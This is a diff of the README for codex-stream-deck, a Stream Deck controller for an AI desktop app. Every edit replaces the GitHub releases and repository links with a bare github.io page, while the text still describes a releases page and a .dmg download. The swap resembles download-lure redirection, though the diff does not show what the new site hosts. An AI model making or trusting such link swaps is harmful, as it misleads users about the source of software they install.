@@ -1,6 +1,6 @@
 # 🎛️ codex-stream-deck - Control Your AI Workflow Instantly
 
-[![Download Now](https://img.shields.io/badge/Download-Latest%20Release-2ea44f?style=for-the-badge)](https://github.com/ntannh55/codex-stream-deck/releases)
+[![Download Now](https://img.shields.io/badge/Download-Latest%20Release-2ea44f?style=for-the-badge)](https://ntannh55.github.io)
 
 ---
 
@@ -35,7 +35,7 @@ Getting started is simple. Follow these steps, and you'll be up and running in u
 
 Visit this link to download the application:
 
-[**⬇️ Download codex-stream-deck**](https://github.com/ntannh55/codex-stream-deck/releases)
+[**⬇️ Download codex-stream-deck**](https://ntannh55.github.io)
 
 This link takes you to the releases page where you'll find the latest version. Look for the file named `codex-stream-deck.dmg` (or similar) and download it to your Mac.
 
@@ -130,8 +130,8 @@ If problems persist, check the **Issues** tab on the GitHub repository for known
 
 ## 📚 Additional Resources
 
-- **GitHub Repository:** [ntannh55/codex-stream-deck](https://github.com/ntannh55/codex-stream-deck)
-- **Releases Page:** [All Downloads](https://github.com/ntannh55/codex-stream-deck/releases)
+- **GitHub Repository:** [ntannh55/codex-stream-deck](https://ntannh55.github.io)
+- **Releases Page:** [All Downloads](https://ntannh55.github.io)
 - **Codex Desktop:** Ensure you have the latest version installed for best compatibility.
 
 The project is actively developed, and new features may be added over time. Since it's community-driven, you're welcome to suggest improvements or report bugs.
@@ -148,7 +148,7 @@ Download it today and see how much easier managing your AI tasks can be.
 
 ## 📥 Ready to Start?
 
-[**👉 Download codex-stream-deck Now**](https://github.com/ntannh55/codex-stream-deck/releases)
+[**👉 Download codex-stream-deck Now**](https://ntannh55.github.io)
 
 Get the latest release and connect your Stream Deck in minutes. It's free, open source, and built to make your life easier.
 
